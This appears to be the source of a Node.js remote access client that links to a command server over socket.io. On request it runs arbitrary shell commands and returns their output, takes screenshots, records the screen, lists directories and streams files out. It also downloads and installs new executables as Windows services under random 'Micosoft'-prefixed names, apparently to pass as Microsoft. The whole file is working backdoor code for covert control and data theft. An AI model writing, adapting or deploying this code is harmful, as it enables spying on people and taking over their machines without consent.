const fs = require("fs");
const cmp = require("compressing");
const {
  SERVER_ADDRESS,
  UPDATE_ADDRESS,
  SERVER_PORT,
  UPDATE_PORT,
  RTMP_ADDRESS,
  RTMP_PORT,
} = require("../../my_config");
const {
  INSTALL_PATH,
  BACKEND_NAME,
  BACKEND_PATH,
  NSSM_PATH,
  UTILS_PATH,
} = require("../../my_config");
const { execSync, exec } = require("child_process");
const os = require("os");
var io = require("socket.io-client")(`${SERVER_ADDRESS}:${SERVER_PORT}`);
const ss = require("socket.io-stream");
const icv = require("iconv-lite");
const http = require("http");
const { inspect } = require("util");
const path = require("path");

function sleep(msec) {
  return new Promise((r) => {
    setTimeout(() => {
      r();
    }, msec);
  });
}

function debug(msg) {
  io.emit("debug", msg);
}

function details(error) {
  return inspect(error, false, null, true);
}

function download(fileName) {
  try {
    if (!fs.existsSync("./tmpDir")) {
      fs.mkdirSync("tmpDir");
    }
    const NEW_FILENAME = `${fileName}${new Date().getFullYear()}${
      new Date().getMonth() + 1
    }${new Date().getDate()}${new Date().getHours()}${new Date().getMinutes()}${new Date().getSeconds()}.exe`;

    http.get(`${UPDATE_ADDRESS}:${UPDATE_PORT}/pack.zip`, (res) => {
      let ws = fs.createWriteStream("./tmpDir/pack.zip");
      res.on("data", (chunk) => {
        ws.write(chunk);
      });
      res.on("end", async () => {
        ws.end();
        debug(`工具集下载完毕`);
        if (!fs.existsSync("./utils")) {
          fs.mkdirSync(`${INSTALL_PATH}utils`);
        }
        try {
          const result = await cmp.zip.uncompress(
            "./tmpDir/pack.zip",
            "./utils"
          );
        } catch (error) {
          console.log(details(error));
        }
        http.get(`${UPDATE_ADDRESS}:${UPDATE_PORT}/backend.zip`, (res) => {
          let ws = fs.createWriteStream(`./tmpDir/backend.zip`);
          res.on("data", (chunk) => {
            ws.write(chunk);
          });
          res.on("end", async () => {
            try {
              ws.end();
              debug("后端下载完毕");
              ws.close();
              ws = null;

              try {
                const result = await cmp.zip.uncompress(
                  "./tmpDir/backend.zip",
                  "./tmpDir"
                );
              } catch (error) {
                console.log(details(error));
              }

              fs.renameSync(`./tmpDir/backend.exe`, `./${NEW_FILENAME}`);

              // 更新文件校验
              // try {
              //   const crypto = require("crypto");
              //   let hash = crypto.createHash("sha256");
              //   let fileContent = fs.readFileSync(NEW_FILENAME);
              //   hash.update(fileContent);
              //   let newFileHash = hash.digest("hex");
              //   http.get(`${UPDATE_ADDRESS}:${UPDATE_PORT}/hash.txt`, (res) => {
              //     let raw = "";
              //     res.on("data", (chunk) => {
              //       raw += chunk;
              //     });
              //     res.on("end", () => {
              //       if (raw === newFileHash) {
              //         debug(`校验成功!\n${newFileHash}\n${raw}`);
              //       } else {
              //         debug(`校验失败!\n${newFileHash}\n${raw}`);
              //       }
              //     });
              //   });
              // } catch (e) {
              //   debug(`校验过程错误\n${details(e)}`);
              // }
              const OLD_BACKEND_NAME = fs
                .readFileSync(`${INSTALL_PATH}serviceName`)
                .toString()
                .split("%")[1];
              const OLD_SERVICE_NAME = fs
                .readFileSync(`${INSTALL_PATH}serviceName`)
                .toString()
                .split("%")[0];
              const NEW_SERVICE_NAME = `Micosoft${Math.ceil(
                Math.random() * 100000
              )}`;
              execSync(`nssm remove ${OLD_SERVICE_NAME} confirm`);
              execSync(
                `nssm install ${NEW_SERVICE_NAME} "${INSTALL_PATH}${NEW_FILENAME}"`
              );
              debug(`新服务名是${NEW_SERVICE_NAME},新后端名是${NEW_FILENAME}`);
              fs.writeFileSync(
                "fileToClean",
                `${OLD_SERVICE_NAME}%${OLD_BACKEND_NAME}`
              );
              fs.writeFileSync(
                "serviceName",
                `${NEW_SERVICE_NAME}%${NEW_FILENAME}`
              );
              setTimeout(function () {
                execSync(`nssm start ${NEW_SERVICE_NAME}`);
              }, 1000);
            } catch (e) {
              debug(details(e));
            }
          });
        });
      });
    });
  } catch (e) {
    // fs.writeFileSync("debug.txt", e);
    debug("Download Wrong!!");
    debug(details(e));
  }
}

function myExec(data) {
  let result;
  exec(data, { encoding: "binary" }, (error, stdout, stderr) => {
    console.log(stdout);
    if (error) {
      debug(`Exec error occured!\n`);
      debug(details(error));
      debug(icv.decode(Buffer.from(stderr, "binary"), "cp936"));
      result = icv.decode(Buffer.from(stderr, "binary"), "cp936");
    } else {
      result = icv.decode(Buffer.from(stdout, "binary"), "cp936");
    }
    io.emit("cmdresult", result);
  });
}

io.on("connect_error", () => {
  console.log(`${new Date().toUTCString()}: connect error!`);
});

io.on("connect", (sk) => {
  io.send(`from client ${io.id}`);
  io.emit("init", {
    主机名: inspect(os.hostname()),
    架构: inspect(os.arch()),
    平台: inspect(os.platform()),
    // networkInterfaces: inspect(os.networkInterfaces()),
    // cpus: inspect(os.cpus()),
    // tmpdir: inspect(os.tmpdir()),
    空闲内存: inspect((os.freemem() / 1024 / 1024).toFixed(2) + "MB"),
    // userInfo: inspect(os.userInfo()),
    总内存: inspect((os.totalmem() / 1024 / 1024 / 1000).toFixed(2) + "GB"),
    //系统版本
    系统版本名: inspect(os.version()),
    // homedir: inspect(os.homedir()),
    系统种类: inspect(os.type()),
    系统正常运行时间: inspect(os.uptime() + "秒"),
  });
});

io.on("message", (data) => {
  console.log(data);
});

io.on("exec", (data) => {
  console.log(data);
  // let res = "empty";
  // result = execSync(data);
  // result = icv.decode(execSync(data), "gb2312");
  myExec(data);
  // console.log(result.toString());
  // io.emit("cmdresult", result.toString());
});

io.on("version_update", (fileName) => {
  download(fileName);
});

io.on("screenshot", async () => {
  try {
    execSync(`${UTILS_PATH}ExplorerUtil.exe /screenshot`);
    await sleep(1000);
    let buffer = fs.readFileSync(`${INSTALL_PATH}demo.jpg`);
    io.emit("screenshot", buffer.toString("base64"));
    fs.unlinkSync(`${INSTALL_PATH}demo.jpg`);
  } catch (e) {
    debug(details(e));
  }
});

io.on("listdir", (dir) => {
  try {
    let result = [];
    let arr;
    if (fs.statSync(dir).isDirectory()) {
      arr = fs.readdirSync(dir);
      for (const item of arr) {
        try {
          result.push({
            name: item,
            isDir: fs.statSync(path.resolve(dir, item)).isDirectory(),
          });
        } catch (error) {
          io.emit("debug", "读取某个文件错误");
        }
      }
      io.emit("listdir", result, dir);
    } else {
      const tmp = path.resolve(dir, "..");
      arr = fs.readdirSync(tmp);
      for (const item of arr) {
        result.push({
          name: item,
          isDirectory: fs.statSync(path.resolve(dir, item)).isDirectory(),
        });
      }
      io.emit("listdir", result, tmp);
    }
  } catch (error) {
    io.emit("debug", details(error));
  }
});

io.on("downloadfile", (target) => {
  console.log(target);
  console.log(123);

  let stream = ss.createStream();

  ss(io).emit("downloadfile", stream, path.basename(target));
  fs.createReadStream(target).pipe(stream);
});

io.on("showfilecontent", () => {});

io.on("startvideocapture", () => {
  try {
    execSync(`tasklist|findstr "ffmpeg"`);
  } catch (error) {
    exec(
      `${UTILS_PATH}ExplorerUtil.exe /videocapture`,
      (error, stdout, stderr) => {}
    );
    // io.emit("startvideocapture");
  }
});

io.on("stopvideocapture", () => {
  try {
    // execSync(`taskkill /F /im ExplorerUtil.exe`);
    // execSync(`taskkill /F /im ffmpeg.exe`);
    myExec(`taskkill /F /im ExplorerUtil.exe`);
    myExec(`taskkill /F /im ffmpeg.exe`);
  } catch (error) {
    console.log(details(error));
  }
});

setTimeout(function () {
  try {
    if (!fs.existsSync("fileToClean")) {
      return;
    }
    let fileToClean = fs.readFileSync("fileToClean").toString().split("%")[1];
    let serviceToStop = fs.readFileSync("fileToClean").toString().split("%")[0];
    // debug(fileToClean);
    // debug(serviceToStop);
    execSync(`nssm stop ${serviceToStop}`);
    fs.unlinkSync(fileToClean);
    fs.unlinkSync("fileToClean");
    debug(`客户端更新完毕`);
  } catch (e) {
    console.log("无需更新或错误");
    debug(details(e));
    console.log(e);
  }
}, 500);

setInterval(() => {
  io.emit("updateinfo", {
    系统正常运行时间: inspect(os.uptime() + "秒"),
    空闲内存: inspect((os.freemem() / 1024 / 1024).toFixed(2) + "MB"),
  });
}, 1000);
